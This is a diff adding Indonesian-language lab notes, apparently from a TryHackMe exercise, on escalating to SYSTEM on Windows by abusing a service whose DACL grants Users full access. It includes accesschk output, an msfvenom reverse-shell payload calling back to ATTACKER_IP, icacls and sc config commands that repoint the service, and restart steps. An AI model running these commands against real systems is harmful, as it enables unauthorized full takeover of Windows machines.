@@ -1,0 +1,44 @@
+# Insecure Service Permissions
+jika service exec well quoted dan sercice exec DACL well configured, maka kita bisa coba service DACL(bukan service executable dibawah DACL) apakah allow kita untuk modify config dari suatu service sehingga kita dapat point ke any exec yang dibutuhkan dan run it pada user apapun termasuk SYSTEM.
+
+Cek permission DACL dengan cara menggunakan Accesschk binary dapat download di `https://download.sysinternals.com/files/AccessChk.zip`
+```
+accesschk64.exe -qlc thmservice
+...
+  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_PAUSE_CONTINUE
+        SERVICE_START
+        SERVICE_STOP
+        SERVICE_USER_DEFINED_CONTROL
+        READ_CONTROL
+...
+...
+  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
+        SERVICE_ALL_ACCESS
+```
+dapat kita lihat bahwa users memiliki semua akses. Kita dapat exploitasi hal tersebut.
+
+Pertama kita buat payload dengan msfvenom
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
+```
+selanjutnya buat listener dan juga kirimkan payload dengan cara membuka python server di attack machine dan download di target. Jika sudah download di target, kita grant permission untuk group Everyone dengan full access
+```
+icacls C:\path\to\payload\rev-svc3.exe /grant Everyone:F
+```
+selanjutnya ganti service yang terasosiasi dengan executable dan account  dengan cara
+```
+sc config THMService binPath= "C:\path\to\payload\rev-svc3.exe" obj= LocalSystem
+```
+LocalSystem disini berarti highest privileged account. selanjutnya kita stop dan start service
+```
+C:\> sc stop THMService
+C:\> sc start THMService
+```
+dan kita akan mendapat revshell SYSTEM priv.
+
+
